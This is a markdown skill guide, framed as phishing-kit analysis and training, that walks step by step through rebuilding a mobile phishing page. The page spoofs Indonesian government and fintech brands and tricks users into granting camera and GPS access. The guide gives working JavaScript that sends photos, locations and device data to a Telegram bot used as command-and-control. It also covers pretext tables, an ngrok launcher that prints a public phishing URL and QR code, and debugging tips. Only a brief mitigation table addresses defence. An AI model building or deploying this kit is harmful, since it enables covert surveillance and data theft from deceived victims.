# Skill: Mobile Phishing Kit Analysis & Reconstruction

Build a complete mobile phishing lab from scratch — analyze a real-world phishing kit, reconstruct its UI spoofing, permission-abuse engine, and Telegram C2 exfiltration pipeline.

---

## When to Use

- When you have a captured phishing HTML file and want to reverse-engineer its flow
- When you need to build a phishing analysis lab for mobile pentest training
- When studying social engineering + browser permission abuse techniques
- When demonstrating how Android/iOS browser phishing with camera+GPS exfiltration works

---

## Prerequisites

| Tool | Purpose |
|------|---------|
| Python 3 | HTTP server |
| ngrok | HTTPS tunnel (public URL) |
| Telegram Bot | C2 channel |
| Browser with DevTools | Debugging permission flows |
| Image assets | For UI spoofing (logos, masks, backgrounds) |

---

## Phase 1: Recon & Analysis of Raw Phishing Kit

When you receive a raw phishing HTML (like the original `phis.html`), extract these elements:

### 1.1 C2 Identification

Search for:
- `api.telegram.org/bot` — Telegram Bot API
- `discord.com/api/webhooks` — Discord webhook
- `webhook.site` — generic webhook
- Hardcoded URLs with tokens/keys

Extract:
- Bot token
- Chat ID / channel ID
- API endpoint pattern

### 1.2 Permission Flow Mapping

Identify all `getUserMedia()` and `getCurrentPosition()` / `watchPosition()` calls:
- What pretext is used? (loading screen, verification, health check)
- What device strategy? (facingMode, fallback chain)
- When are permissions triggered? (auto vs click-initiated)
- What error handling? (fallback behavior on denial)

### 1.3 Exfiltrated Data Catalog

| Data Source | API / Method |
|-------------|-------------|
| User-Agent, platform | `navigator.userAgent`, `navigator.platform` |
| RAM, CPU | `navigator.deviceMemory`, `navigator.hardwareConcurrency` |
| Battery | `navigator.getBattery()` |
| Screen | `screen.width`, `screen.height` |
| IP + Geo | `ipapi.co/json/` or `ipinfo.io/json` |
| Reverse Geo | `nominatim.openstreetmap.org/reverse` |
| Camera | `getUserMedia` → canvas → blob → `sendPhoto` |
| GPS | `getCurrentPosition` → lat/lon → `sendMessage` |
| Screenshot | `html2canvas` → blob → `sendPhoto` |

### 1.4 UI Spoofing Analysis

- What brand/theme is being spoofed? (government, fintech, health, telecom)
- What social engineering pretext? (fear, urgency, reward)
- What visual elements? (logos, colors, fonts, layout)
- What progress/loading mechanism? (keeps user waiting)

---

## Phase 2: Design the Replacement UI

Select a theme that legitimately uses both camera + location. Common pretexts:

| Theme | Camera Pretext | Location Pretext |
|-------|---------------|-------------------|
| e-KYC / Fintech | Foto KTP + selfie verifikasi | Deteksi alamat domisili |
| Health Check / Telemedicine | Scan wajah untuk analisis suhu | Cari faskes terdekat |
| Government (e-Health) | Verifikasi biometric | Tracking kontak / tracing |
| Insurance Claim | Foto dokumen + wajah | Verifikasi lokasi kejadian |
| Vaccine / SATUSEHAT | Scan QR vaksin + verifikasi | Check-in lokasi |

### Design Guidelines

- Use target brand's actual colors (extract via `identify -verbose` or color picker)
- Match typography (Google Fonts, system fonts)
- Match layout proportions (reference image dimensions)
- Add realistic micro-interactions (sparkles, badges, shadows)
- Responsive: mobile-first with breakpoints covering 1024/860/768/480px

---

## Phase 3: Build Core Engine

### 3.1 Device Detection

```javascript
const detectDevice = () => {
    const ua = navigator.userAgent
    if (/iPad|Android(?!.*Mobile)|Tablet/i.test(ua)) return 'tablet'
    if (/Mobile|Android|iPhone|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return 'mobile'
    return 'desktop'
}
```

### 3.2 Multi-Device Camera Strategy

```javascript
// Mobile/Tablet: environment first, user fallback
// Desktop: default webcam
if (dev === 'mobile' || dev === 'tablet') {
    if (!(await tryCam({facingMode: {exact: 'environment'}}))) {
        await tryCam({facingMode: {exact: 'user'}})
    }
} else {
    await tryCam({width: {ideal: 1280}, height: {ideal: 720}})
}
```

### 3.3 Permission Trigger Strategy

Must be called from user gesture (click handler) for `transient activation`:

```javascript
cta.addEventListener('click', async e => {
    e.preventDefault()
    // Both initiated in same sync context = both have user gesture
    const camPromise = navigator.mediaDevices.getUserMedia({video: constraints})
    const locPromise = new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(resolve, resolve, options)
    })
    await camPromise  // wait for user to Allow camera
    await locPromise  // wait for user to Allow location
})
```

### 3.4 Overlay Design (Zero-Interaction)

```css
.overlay {
    position: fixed; inset: 0; z-index: 9999;
    background: rgba(0,0,0,0.7);
    backdrop-filter: blur(8px);
    display: none;
    align-items: center; justify-content: center;
}
.overlay.active { display: flex; }
```

No buttons, no clicks — purely informational. User only interacts with native browser dialogs.

### 3.5 Telegram Exfiltration Template

```javascript
const tgText = async data => {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: data, parse_mode: 'HTML'})
    })
}

const tgPhoto = async (blob, name) => {
    const fd = new FormData()
    fd.append('chat_id', CHAT_ID)
    fd.append('photo', blob, name)
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method: 'POST', body: fd})
}
```

---

## Phase 4: Infrastructure Setup

### 4.1 serve.py Architecture

```
serve.py
  ├── subprocess: python -m http.server [PORT]
  ├── subprocess: ngrok http [PORT]
  ├── Poll localhost:4040/api/tunnels → extract public_url
  └── Print: PHISHING URL + QR code
```

Key features:
- Signal handler for clean shutdown (SIGINT/SIGTERM)
- Retry logic for ngrok URL (5 attempts with 1s delay)
- Custom port via CLI argument: `python serve.py 9090`
- QR code URL generation: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={URL}`

### 4.2 Requirements

```bash
# System
sudo apt install ngrok  # or download from ngrok.com

# Python (stdlib only — no pip needed)
python3 -m http.server  # built-in

# ngrok auth (one-time)
ngrok config add-authtoken YOUR_TOKEN
```

---

## Phase 5: Testing & Debugging

### 5.1 Test Matrix

| Device | Browser | Camera | GPS | Expected |
|--------|---------|--------|-----|----------|
| Android | Chrome | environment→user | GPS + IP fallback | 2 dialogs, 3 Telegram messages |
| iOS | Safari | user only | GPS | 2 dialogs (permission timing differs) |
| Desktop | Chrome | webcam | IP only (no GPS) | 2 dialogs, IP geo instead of GPS |
| Desktop | Firefox | webcam | IP only | Same as Chrome |
| Tablet | Chrome | environment→user | GPS | Same as mobile |

### 5.2 Common Issues

| Issue | Cause | Fix |
|-------|-------|-----|
| Camera denied on iOS | Safari requires user gesture + HTTPS | Ensure ngrok HTTPS; call from click handler |
| Location denied on Chrome after camera | Lost transient activation | Initiate both promises synchronously from same click |
| html2canvas renders blank | CORS blocked by image host | Add `useCORS: true`, proxy images, or use same-origin assets |
| `getCurrentPosition` times out | GPS unavailable indoors | Reduce `timeout` to 5s; ensure `enableHighAccuracy: false` fallback |
| Photo blob empty | Canvas tainted by cross-origin video | Use `prefer-capture` or check `videoWidth/videoHeight > 0` |

### 5.3 DevTools Debugging

```javascript
// Force camera denial for testing
navigator.mediaDevices.getUserMedia = () => Promise.reject(new Error('NotAllowedError'))

// Log all Telegram traffic
const origFetch = window.fetch
window.fetch = (...args) => {
    if (args[0].includes('api.telegram.org')) console.log('TG:', args)
    return origFetch(...args)
}
```

---

## Phase 6: Cleanup & Artifacts

### 6.1 Files to Clean After Testing

| File | Reason |
|------|--------|
| Bot token in source | Revoke via @BotFather after testing |
| ngrok session | Auto-expires, but stop with Ctrl+C |
| Screenshots/captures | Delete from Telegram chat |
| Server logs | Check for captured data remnants |

### 6.2 Deliverable Artifacts

```
Phish/
├── phis.html          # Reconstructed phishing page
├── serve.py           # Infrastructure launcher
├── asset/             # Brand assets (logos, mascots)
│   ├── logo-kpk.png
│   ├── logo-jaga.png
│   └── Maskot-jaga.png
├── README.md          # Documentation with full flow analysis
└── SKILL.md           # This file — rebuild guide
```

---

## Mitigation Recommendations

| Vector | Mitigation |
|--------|------------|
| URL spoofing | Check domain — ngrok/pages.dev/github.io are suspicious |
| Brand spoofing | Verify via official app/site, not from links |
| Permission abuse | Deny camera/location if context doesn't make sense |
| Hidden camera | Browser shows green indicator dot — check status bar |
| Telegram exfil | Monitor outgoing requests (F-Droid: NetGuard, PCAPdroid) |
| Social engineering | Critical thinking: "Why does KPK need my camera?" |

---

## References

- Telegram Bot API: https://core.telegram.org/bots/api
- html2canvas: https://html2canvas.hertzen.com
- ipapi.co: https://ipapi.co
- Nominatim: https://nominatim.openstreetmap.org
- ngrok: https://ngrok.com
- getUserMedia spec: https://w3c.github.io/mediacapture-main/
- Geolocation API: https://w3c.github.io/geolocation-api/
